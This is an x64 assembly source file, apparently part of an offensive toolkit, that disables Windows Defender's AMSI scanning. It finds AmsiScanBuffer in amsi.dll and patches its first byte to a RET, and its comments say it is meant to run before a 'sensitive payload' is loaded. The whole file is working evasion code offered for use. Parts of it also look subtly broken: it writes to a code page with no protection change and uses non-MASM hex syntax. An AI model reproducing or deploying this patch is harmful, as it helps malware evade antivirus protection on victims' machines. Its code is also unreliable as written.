; Evasion/amsi_patch.asm - In-Memory AMSI Patch (x64)
; Description: Bypasses Windows Defender's Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer function in memory.
; This makes AmsiScanBuffer return immediately, effectively disabling AMSI scanning for the current process.
; We achieve this by overwriting the function's first byte with a `ret` instruction (0xC3).
;
; Note: This stub uses WinAPI calls to locate AmsiScanBuffer. It should be executed before loading any sensitive payload.

        extrn   GetModuleHandleA : proc
        extrn   GetProcAddress   : proc
        extrn   LoadLibraryA     : proc

.data
amsiDllName    db "amsi.dll", 0
amsiFuncName   db "AmsiScanBuffer", 0

.code
PatchAMSI PROC
    sub     rsp, 20h                          ; Reserve shadow space for WinAPI calls (32 bytes)
    ; Get handle of amsi.dll (if already loaded)
    lea     rcx, amsiDllName                  ; RCX = pointer to "amsi.dll"
    call    GetModuleHandleA
    cmp     rax, 0
    jne     AmsiLoaded
    ; If amsi.dll is not loaded, load it
    lea     rcx, amsiDllName                  ; RCX = pointer to "amsi.dll"
    call    LoadLibraryA
AmsiLoaded:
    mov     rbx, rax                          ; RBX = hModule of amsi.dll
    ; Get address of AmsiScanBuffer function
    mov     rcx, rbx                          ; RCX = hModule (amsi.dll base address)
    lea     rdx, amsiFuncName                 ; RDX = pointer to "AmsiScanBuffer"
    call    GetProcAddress
    ; RAX now holds the address of AmsiScanBuffer
    mov     byte ptr [rax], 0xC3              ; Patch first byte to 0xC3 (RET instruction)
    ; (Optionally, one could patch more bytes to set RAX = 0 before RET for a clean return value)
    add     rsp, 20h
    ret
PatchAMSI ENDP
END
